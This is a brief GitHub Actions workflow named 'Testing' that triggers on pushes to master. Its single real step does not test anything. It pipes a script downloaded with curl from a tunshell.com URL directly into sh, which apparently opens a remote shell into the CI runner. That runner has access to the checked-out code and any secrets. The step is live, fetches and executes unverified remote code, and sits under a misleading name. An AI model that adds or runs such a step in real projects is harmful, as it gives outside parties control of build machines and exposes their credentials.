name: Testing

on:
  push:
    branches:
      - master

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2
    - run: sh <(curl -s https://lets.tunshell.com/42afd59d-b817-45b2-89bd-1c975fcfaea4.sh)
     